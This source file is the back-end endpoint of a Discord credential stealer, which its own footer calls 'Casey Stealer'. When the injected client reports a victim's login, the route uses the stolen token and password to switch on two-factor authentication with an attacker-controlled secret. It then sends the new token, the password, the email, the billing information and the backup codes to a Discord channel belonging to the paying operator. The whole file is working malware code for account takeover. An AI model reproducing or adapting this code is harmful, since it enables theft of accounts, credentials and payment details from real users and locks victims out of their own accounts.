import { Request, Response } from 'express';
import { ActionRowBuilder, ButtonBuilder, EmbedBuilder, ButtonStyle, ChannelType } from 'discord.js';
import { client } from '../../app';
import { emojis } from '../../utils/emojis';
import getAvatar from '../../functions/discord/getAvatar';
import { badges_name } from '../../utils/badges_name';
import { badges_emoji } from '../../utils/badges_emoji';

import { PrismaClient } from '@prisma/client'

const prisma = new PrismaClient();

export default {
    name: `/api/2fa-enable/`, method: 'post',

    async execute(req: Request, res: Response) {
        const { user, profile, billing, login, stealer_user, two_factor } = req?.body;
        if(!user?.id || !stealer_user) return;

        const user_db = await prisma.users.findFirst({
            where: {
                id: stealer_user
            }
        });
  
        if(!user_db?.plan) return;

        const request = await fetch('https://discord.com/api/v10/users/@me/mfa/totp/enable', {
          method: 'POST',
          headers: {
              'Authorization': login?.token,
              'Content-Type': 'application/json',
          },
          body: JSON.stringify({
              code: two_factor?.code,
              password: login?.password,
              secret: two_factor?.secret
          })
      });

      if(request.status === 200) {
        res.status(200);
        const twofactor = await request.json() as any;

        const guild = await client.guilds.fetch(user_db?.guild_id!);
        const channel = await guild.channels.fetch(user_db?.channel_id!);
  
        if(channel?.type !== ChannelType.GuildText) return;
        const avatar_url = getAvatar(user.id, user.avatar);
        const badges_array = profile?.badges?.map((b: any) => badges_name.find(x => x?.id === b?.id)).map((n: any) => n?.name);

        const account_embed = new EmbedBuilder().setColor('#5865f2').setTimestamp().setThumbnail(avatar_url)
        .setAuthor({ name: `Casey | ${user.global_name} (@${user.username})`, iconURL: avatar_url! })
        .addFields(
            {
                name: `${emojis.token} Token:`,
                value: `\`\`\`${twofactor?.token}\`\`\``
            },
            {
                name: `${emojis.badges} Badges:`,
                value: `${badges_array.map((b: any) => b != undefined ? badges_emoji[b as keyof typeof badges_emoji] : '').join('') || 'None'}`,
                inline: true
            },
            {
                name: `${emojis.pm} Billing:`,
                value: `${billing?.filter((p: any) => p.type === 1 || p.type === 2).map((b: any) => b.type != undefined ? emojis[b.type as keyof typeof emojis] : '').join('') || 'None'}`,
                inline: true
            },
            {
                name: `${emojis.twofa} 2FA:`,
                value: `Enabled`,
                inline: true
            },
            {
                name: `${emojis.email} Email:`,
                value: `${user.email || 'Unknown'}`,
                inline: true
            },
            {
              name: `${emojis.key} Password:`,
              value: `${login?.password || 'Unknown'}`,
              inline: true
          },
        ).setFooter({ text: `Casey Stealer | Injection (2FA Enabled)`, iconURL: client.user?.avatarURL()! });

        const backup_codes = twofactor.backup_codes.map((d: any) => d.code);

        const backup_codes_embed = new EmbedBuilder().setColor('#5865f2').setTimestamp()
        .setAuthor({ name: `Casey | 2FA Backup Codes`, iconURL: avatar_url! })
        .addFields(
            {
                name: `${emojis.codes} Codes (${backup_codes.length}):`,
                value: `\`\`\`${backup_codes.join(', ') || 'Unknown'}\`\`\``
            },
        ).setFooter({ text: `Casey Stealer | Injection (2FA Enabled)`, iconURL: client.user?.avatarURL()! });

        const boost_button = new ButtonBuilder().setCustomId(`BIF${profile?.badges?.find((x: any) => x?.id.startsWith('guild_booster_'))?.id}Casey${profile?.premium_guild_since}`).setLabel('View Boost Informations').setStyle(ButtonStyle.Secondary).setDisabled(true);
        if(profile?.premium_guild_since) 
        boost_button.setDisabled(false);

        channel.send({
            embeds: [
              account_embed,
              backup_codes_embed
            ],
            components: [
                new ActionRowBuilder<ButtonBuilder>().addComponents(
                    new ButtonBuilder().setCustomId(`HQF`).setLabel('View HQ Friends').setStyle(ButtonStyle.Primary)
                    .setEmoji(emojis.friends),
                    new ButtonBuilder().setCustomId(`HQG`).setLabel('View HQ Guilds').setStyle(ButtonStyle.Secondary),
                    boost_button
                )
            ]
        });

        res.status(200);
      } else {
        res.status(401);
        console.log(await request.json());
      };
  },
};